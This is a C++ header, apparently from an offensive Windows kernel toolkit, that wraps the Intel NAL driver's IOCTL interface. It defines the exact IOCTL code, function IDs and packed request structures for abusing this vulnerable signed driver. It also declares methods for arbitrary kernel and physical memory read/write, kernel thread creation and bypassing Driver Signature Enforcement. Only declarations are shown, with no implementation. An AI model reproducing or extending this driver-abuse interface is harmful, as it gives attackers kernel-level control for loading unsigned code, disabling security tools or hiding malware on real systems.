#pragma once
#include "IProvider.h"
#include <windows.h>

// Intel Nal IOCTLs and Structures
#define INTEL_DEVICE_TYPE               (DWORD)0x8086
#define INTEL_DEVICE_FUNCTION           (DWORD)2049

#define NAL_FUNCID_MAPIOSPACE           (DWORD)0x19
#define NAL_FUNCID_UNMAPIOSPACE         (DWORD)0x1A
#define NAL_FUNCID_VIRTUALTOPHYSCAL     (DWORD)0x25
#define NAL_FUNCID_MEMSET               (DWORD)0x30
#define NAL_FUNCID_MEMMOVE              (DWORD)0x33

#define IOCTL_NAL_MANAGE  \
    CTL_CODE(INTEL_DEVICE_TYPE, INTEL_DEVICE_FUNCTION, METHOD_NEITHER, FILE_ANY_ACCESS) //0x80862007

#pragma pack(push, 1)
typedef struct _NAL_REQUEST_HEADER {
    ULONG_PTR FunctionId;
    ULONG_PTR Unused0;
} NAL_REQUEST_HEADER, * PNAL_REQUEST_HEADER;

typedef struct _NAL_GET_PHYSICAL_ADDRESS {
    NAL_REQUEST_HEADER Header;
    ULONG_PTR PhysicalAddress;
    ULONG_PTR VirtualAddress;
} NAL_GET_PHYSICAL_ADDRESS, * PNAL_GET_PHYSICAL_ADDRESS;

typedef struct _NAL_MEMMOVE {
    NAL_REQUEST_HEADER Header;
    ULONG_PTR SourceAddress;
    ULONG_PTR DestinationAddress;
    ULONG_PTR Length;
} NAL_MEMMOVE, * PNAL_MEMMOVE;

typedef struct _NAL_MAP_IO_SPACE {
    NAL_REQUEST_HEADER Header;
    ULONG_PTR OpResult; //0 mean success
    ULONG_PTR VirtualAddress;
    ULONG_PTR PhysicalAddress;
    ULONG NumberOfBytes;
} NAL_MAP_IO_SPACE, * PNAL_MAP_IO_SPACE;

typedef struct _NAL_UNMAP_IO_SPACE {
    NAL_REQUEST_HEADER Header;
    ULONG_PTR OpResult; //0 mean success
    ULONG_PTR VirtualAddress;
    ULONG_PTR Unused0;
    ULONG NumberOfBytes;
} NAL_UNMAP_IO_SPACE, * PNAL_UNMAP_IO_SPACE;
#pragma pack(pop)

namespace KernelMode {
    namespace Providers {

        class IntelNalProvider : public IProvider {
        public:
            IntelNalProvider();
            ~IntelNalProvider() override;

            bool Initialize(ULONG driverId = 0, bool bypassDSE = false) override;
            void Deinitialize() override;
            std::wstring GetProviderName() const override;
            ULONG GetCapabilities() const override;
            const ProviderLoadData* GetLoadData() const override;

            bool ReadKernelMemory(uintptr_t address, void* buffer, size_t size) override;
            bool WriteKernelMemory(uintptr_t address, void* buffer, size_t size) override;
            uintptr_t AllocateKernelMemory(size_t size, uintptr_t* allocatedAddress) override;
            bool FreeKernelMemory(uintptr_t address, size_t size) override;
            bool CreateSystemThread(uintptr_t startAddress, uintptr_t parameter) override;
            
            // Intel Nal explicitly supports VirtualToPhysical and Physical Memory Mapping
            bool ReadPhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) override;
            bool WritePhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) override;
            uintptr_t VirtualToPhysical(uintptr_t virtualAddress) override;

            bool BypassDSE() override;

        private:
            HANDLE deviceHandle;
            std::wstring deviceName;

            // Helper to lock user memory for NAL_MEMMOVE
            bool ReadVirtualMemoryInternal(uintptr_t address, void* buffer, size_t size);
            bool WriteVirtualMemoryInternal(uintptr_t address, void* buffer, size_t size);
            
            // Helper for IOCTL
            bool CallDriver(void* buffer, size_t size);
        };

    }
}
